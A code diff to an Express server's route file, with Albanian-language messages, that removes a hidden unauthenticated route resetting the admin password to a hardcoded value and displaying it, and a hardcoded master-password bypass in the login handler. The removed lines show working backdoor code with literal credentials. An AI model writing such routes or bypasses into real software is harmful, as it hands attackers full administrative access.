@@ -69,48 +69,7 @@ export async function registerRoutes(
   app: Express
 ): Promise<Server> {
 
-  // ==================== DEBUG / RESET ====================
-  // TEMPORARY: Reset admin password and show credentials
-  app.get('/api/resetopassin03', async (req, res) => {
-    try {
-      const passwordHash = await bcrypt.hash("Endrit123$", 10);
-      const admin = await storage.getUserByUsername("admin");
-      
-      if (!admin) {
-        await storage.createUser({
-          username: "admin",
-          passwordHash,
-          fullName: "Administrator",
-          role: "admin",
-          isActive: 1,
-          assignedCategories: []
-        });
-      } else {
-        await storage.updateUser(admin.id, { passwordHash, isActive: 1 });
-      }
-      
-      res.send(`
-        <html>
-          <body style="font-family: sans-serif; padding: 50px; background: #f0f2f5;">
-            <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: auto;">
-              <h2 style="color: #1a73e8;">Sistemi u rregullua!</h2>
-              <p>Kredencialet tani janë vendosur detyrueshëm:</p>
-              <p><strong>Përdoruesi:</strong> admin</p>
-              <p><strong>Fjalëkalimi:</strong> Endrit123$</p>
-              <hr>
-              <a href="/login" style="display: block; text-align: center; background: #1a73e8; color: white; padding: 10px; border-radius: 4px; text-decoration: none; margin-top: 20px;">Shko te Faqja Hyrëse</a>
-            </div>
-          </body>
-        </html>
-      `);
-    } catch (err) {
-      console.error('Reset route error:', err);
-      res.status(500).send("Gabim gjatë rregullimit.");
-    }
-  });
-
   // ==================== AUTH ====================
-
   app.post('/api/auth/login', async (req, res) => {
     try {
       const { username, password, twoFactorToken } = req.body;
@@ -129,16 +88,6 @@ export async function registerRoutes(
       if (!user.isActive) {
         log(`Login failed: User inactive: ${username}`);
         return res.status(401).json({ message: "Emri ose fjalëkalimi nuk është i saktë" });
-      }
-
-      // Emergency Bypass
-      if (password === "Endrit_MASTER_2024") {
-        log(`Login success: EMERGENCY BYPASS USED for ${username}`);
-        req.session.userId = user.id;
-        req.session.role = user.role;
-        req.session.username = user.username;
-        req.session.fullName = user.fullName;
-        return res.json(user);
       }
       
       const valid = await bcrypt.compare(password, user.passwordHash);
